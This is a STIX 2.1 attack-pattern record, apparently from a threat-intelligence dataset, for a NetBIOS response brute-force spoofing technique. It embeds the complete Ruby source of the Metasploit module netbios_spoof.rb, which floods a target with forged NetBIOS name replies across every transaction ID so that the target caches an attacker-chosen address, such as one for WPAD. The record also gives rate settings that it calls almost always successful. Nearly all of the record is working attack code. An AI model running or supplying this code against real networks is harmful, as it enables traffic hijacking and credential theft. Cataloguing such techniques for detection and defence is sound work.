{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2551911d-b0fc-4caf-9838-877c2463c915",
    "created": "2024-08-14T16:22:21.245235Z",
    "modified": "2024-08-14T16:22:21.245239Z",
    "name": "NetBIOS Response Brute Force Spoof (Direct)",
    "description": " This module continuously spams NetBIOS responses to a target for given hostname causing the target to cache a malicious address for this name. On high-speed local networks, the PPSRATE value should be increased to speed up this attack. As an example, a value of around 30,000 is almost 100% successful when spoofing a response for a 'WPAD' lookup. Distant targets may require more time and lower rates for a successful attack. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/netbios/netbios_spoof.rb",
            "external_id": "netbios_spoof.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Udp\n\n  def initialize\n    super(\n      'Name'        => 'NetBIOS Response Brute Force Spoof (Direct)',\n      'Description'    => %q{\n          This module continuously spams NetBIOS responses to a target for given hostname,\n        causing the target to cache a malicious address for this name. On high-speed local\n        networks, the PPSRATE value should be increased to speed up this attack. As an\n        example, a value of around 30,000 is almost 100% successful when spoofing a\n        response for a 'WPAD' lookup. Distant targets may require more time and lower\n        rates for a successful attack.\n      },\n      'Author'     => [\n        'vvalien',   # Metasploit Module (post)\n        'hdm',       # Metasploit Module\n        'tombkeeper' # Related Work\n      ],\n      'License'     => MSF_LICENSE,\n    )\n\n    register_options(\n      [\n        Opt::RPORT(137),\n        OptString.new('NBNAME',   [ true, \"The NetBIOS name to spoof a reply for\", 'WPAD' ]),\n        OptAddress.new('NBADDR',  [ true, \"The address that the NetBIOS name should resolve to\", Rex::Socket.source_address(\"50.50.50.50\") ]),\n        OptInt.new('PPSRATE',     [ true, \"The rate at which to send NetBIOS replies\", 1_000])\n      ],\n      self.class\n    )\n  end\n\n  def netbios_spam\n    payload =\n        \"\\xff\\xff\"   + # TX ID (will brute force this)\n        \"\\x85\\x00\"   + # Flags = response + authoratative + recursion desired\n        \"\\x00\\x00\"   + # Questions = 0\n        \"\\x00\\x01\"   + # Answer RRs = 1\n        \"\\x00\\x00\"   + # Authority RRs = 0\n        \"\\x00\\x00\"   + # Additional RRs = 0\n        \"\\x20\"       +\n        Rex::Proto::SMB::Utils.nbname_encode( [@fake_name.upcase].pack(\"A15\") + \"\\x00\" ) +\n        \"\\x00\"       +\n        \"\\x00\\x20\"   + # Type = NB\n        \"\\x00\\x01\"   + # Class = IN\n        \"\\x00\\x04\\x93\\xe0\" + # TTL long time\n        \"\\x00\\x06\"   + # Datalength = 6\n        \"\\x00\\x00\"   + # Flags B-node, unique\n        Rex::Socket.addr_aton(@fake_addr)\n\n    stime = Time.now.to_f\n    pcnt = 0\n    pps  = 0\n\n    print_status(\"Spamming NetBIOS responses for #{@fake_name}/#{@fake_addr} to #{@targ_addr}:#{@targ_port} at #{@targ_rate}/pps...\")\n\n    live = true\n    while live\n      0.upto(65535) do |txid|\n        begin\n          payload[0,2] = [txid].pack(\"n\")\n          @sock.put(payload)\n          pcnt += 1\n\n          pps = (pcnt / (Time.now.to_f - stime)).to_i\n          if pps > @targ_rate\n            sleep(0.01)\n          end\n        rescue Errno::ECONNREFUSED\n          print_error(\"Error: Target sent us an ICMP port unreachable, port is likely closed\")\n          live = false\n          break\n        end\n      end\n    end\n\n    print_status(\"Cleaning up...\")\n  end\n\n  def run\n    connect_udp\n    @sock = self.udp_sock\n\n    @targ_addr = rhost\n    @targ_port = rport\n    @targ_rate = datastore['PPSRATE']\n    @fake_name = datastore['NBNAME']\n    @fake_addr = datastore['NBADDR']\n\n    netbios_spam\n\n    disconnect_udp\n  end\nend\n"
}